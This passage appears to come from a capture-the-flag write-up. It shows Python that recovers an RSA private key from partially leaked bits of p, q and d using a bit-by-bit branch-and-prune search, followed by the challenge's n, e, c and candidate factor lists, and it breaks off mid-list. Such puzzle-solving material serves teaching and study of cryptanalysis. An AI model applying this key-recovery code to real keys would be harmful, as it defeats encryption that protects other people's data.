<span class="string">&#x27;0&#x27;</span>, <span class="number">284</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">503</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">298</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">477</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">376</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">210</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">364</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">163</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">213</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">295</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">111</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">458</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">146</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">244</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">261</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">508</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">106</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">120</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">156</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">303</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">259</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">444</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">215</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">304</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">140</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">351</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">443</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line">hint3 = &#123;<span class="number">891</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">74</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">129</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">477</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">880</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">289</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">361</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1012</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">529</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">294</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">174</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">500</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">257</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">392</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">405</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">763</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">637</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">564</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">941</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">923</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1014</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">670</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">558</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">304</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">444</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">716</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">208</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">130</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">634</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">661</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">862</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">796</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">761</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">113</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">752</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">818</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">797</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">390</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">337</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">367</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">470</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">345</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">170</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">312</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">624</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">75</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">281</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">522</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">100</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">554</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">583</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">836</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">715</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">450</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">484</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">876</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">165</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">842</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">442</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">927</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">586</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">399</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">227</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">886</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">663</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">947</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">906</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">377</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">246</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">365</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">936</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">144</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">416</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">228</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">366</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">117</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">78</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">717</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">800</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">662</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">970</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">986</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">287</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">597</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">783</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">805</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">671</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">540</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">153</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">577</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">543</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">414</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">626</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">452</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">810</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">905</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">602</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">537</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">374</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">408</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">434</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">137</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">532</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">397</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">333</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">258</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">359</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">134</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">322</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">653</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1018</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">639</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">826</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">489</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">858</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">516</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">149</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">945</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">106</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">694</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">221</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">207</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">186</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">316</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">297</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">276</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">103</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">437</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">802</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">108</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">921</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">427</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">728</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">879</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">953</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">459</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">559</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">610</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">341</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">299</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">952</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">201</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">741</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">253</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">946</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">696</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">398</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">266</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">829</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">908</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">469</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">873</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">658</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">798</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">621</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">238</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">654</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">205</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">925</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">391</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">480</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">598</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">677</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">142</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">606</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">118</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">164</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">973</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">347</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">159</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">307</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">83</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">668</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">675</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">924</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">191</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">890</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">965</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">692</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">782</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">817</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">889</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">515</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">433</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">356</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">845</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">979</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">426</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">785</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">546</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">824</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">704</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">510</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">710</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1022</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">647</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">465</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">245</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">850</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">657</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1007</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">807</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">158</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">328</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">292</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">355</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">596</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">275</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">371</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1004</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">594</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">384</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">446</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">994</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">616</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">317</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">305</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">151</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">400</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">900</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">203</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">563</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">745</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">536</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">726</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">751</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">402</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">116</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">781</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">988</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">768</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">688</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">954</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">976</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">868</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">723</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">131</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">794</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">513</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">914</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">641</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">319</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">629</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">620</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">711</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">601</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">531</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">393</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">168</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">132</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">950</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">488</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">679</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">568</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">545</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">217</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">680</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">501</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1008</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">514</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">746</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">187</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">436</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">336</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">139</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">338</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">695</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">300</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">584</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">152</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">828</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">251</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">691</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">128</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">394</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">655</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">544</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">313</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">565</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">685</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">720</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">178</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">667</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">403</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">697</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">138</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">659</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">960</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">454</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">271</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">295</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">600</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">579</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">68</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">211</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">82</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">114</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">209</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">226</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">753</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">874</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">903</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">358</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">141</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">236</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getnum</span>(<span class="params">hint, bit</span>):</span><br><span class="line">    s = [<span class="string">&#x27;?&#x27;</span>] * bit</span><br><span class="line">    <span class="keyword">for</span> tmp <span class="keyword">in</span> hint.items():</span><br><span class="line">        s[tmp[<span class="number">0</span>]] = tmp[<span class="number">1</span>]</span><br><span class="line">    ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ss.join(s)</span><br><span class="line"></span><br><span class="line">p_corr = getnum(hint1, <span class="number">512</span>)</span><br><span class="line">q_corr = getnum(hint2, <span class="number">512</span>)</span><br><span class="line">d_corr = getnum(hint3, <span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p = &#x27;</span>, p_corr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q = &#x27;</span>, q_corr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;d = &#x27;</span>, d_corr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_s</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="string">&#x27;?&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="built_in">int</span>(x)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_3_k</span>(<span class="params">total_len</span>):</span><br><span class="line">    cur_ans = [(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)] <span class="comment"># d, p, q, k</span></span><br><span class="line">    mod_num = <span class="number">1</span></span><br><span class="line">    cur_num = <span class="number">1</span></span><br><span class="line">    k = <span class="number">1972411342</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(total_len):</span><br><span class="line">        mod_num *= <span class="number">2</span></span><br><span class="line">        nxt_ans = []</span><br><span class="line">        pset, qset, dset = <span class="built_in">set</span>(), <span class="built_in">set</span>(), <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> d, p, q <span class="keyword">in</span> cur_ans:</span><br><span class="line">            <span class="keyword">for</span> cur_p <span class="keyword">in</span> get_s(p_corr[- i - <span class="number">1</span>]):</span><br><span class="line">                nxt_p = p + cur_p * cur_num</span><br><span class="line">                <span class="keyword">for</span> cur_q <span class="keyword">in</span> get_s(q_corr[- i - <span class="number">1</span>]):</span><br><span class="line">                    nxt_q = q + cur_q * cur_num</span><br><span class="line">                    <span class="comment"># check n = pq</span></span><br><span class="line">                    nxt_n = nxt_p * nxt_q % mod_num</span><br><span class="line">                    <span class="keyword">if</span> (n % mod_num == nxt_n):</span><br><span class="line">                        <span class="keyword">for</span> cur_d <span class="keyword">in</span> get_s(d_corr[- i -  <span class="number">1</span>]):</span><br><span class="line">                            nxt_d = d + cur_d * cur_num</span><br><span class="line">                            <span class="comment"># check phi</span></span><br><span class="line">                            <span class="keyword">if</span> (e * nxt_d % mod_num == (k * (nxt_p - <span class="number">1</span>) % mod_num * (nxt_q - <span class="number">1</span>) + <span class="number">1</span>) % mod_num):</span><br><span class="line">                                <span class="comment"># ok</span></span><br><span class="line">                                nxt_ans.append((nxt_d, nxt_p, nxt_q))</span><br><span class="line">                                pset.add(nxt_p)</span><br><span class="line">                                qset.add(nxt_q)</span><br><span class="line">                                dset.add(nxt_d)</span><br><span class="line">        cur_ans = nxt_ans</span><br><span class="line">        cur_num *= <span class="number">2</span></span><br><span class="line">        <span class="built_in">print</span>(i, <span class="built_in">len</span>(cur_ans), cur_ans[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;number of p:&#x27;</span>, <span class="built_in">len</span>(pset))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;number of q:&#x27;</span>, <span class="built_in">len</span>(qset))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;number of d:&#x27;</span>, <span class="built_in">len</span>(dset))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cur_ans</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(update_3_k(<span class="number">512</span>))</span><br></pre></td></tr></table></figure>
<p>分解之后就有了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">73380160475470842653695210816683702314062827937540324056880543809752271506601290265975543542548117392788987830919581511428492717214125296973338501980504384307279414528799452106399062576988406269897425829853390463840834798274139351938197666753546672052277640048588091137812362810008344723302886421059831149393</span></span><br><span class="line">e = <span class="number">3116872133</span></span><br><span class="line">c = <span class="number">69574121902821459446683688068339366486115223765903849266663001038736496551168104587683366853482649748413400537793260948337629422998336301256862519087984048032673577462034223842650399943613576577927825123830629917138007035313624847266208032195071033675853881447717750353382112841885318776240405314057286867952</span></span><br><span class="line"></span><br><span class="line">sol_list = [(<span class="number">7784868472609835283772369288450719687831855595004708832036599005696915154950995935461077898788049056940742159122868259556603407924884969346573163242612229</span>, <span class="number">5366239629682084697715680375675183284975073589647891453436177052547030069350226021009383094270291268448822558390838025112113425896384691203885755013446291</span>, <span class="number">7752453331027896289378165428906797427594364441082026942376869840211846057088210327758608246566696642059981985937946346433942230652922826983630336158233867</span>), (<span class="number">7784868472609835283772369288450719687831855595004708832036599005696915154950995935461077898788049056940742159122868259556603407924884969346573163242612229</span>, <span 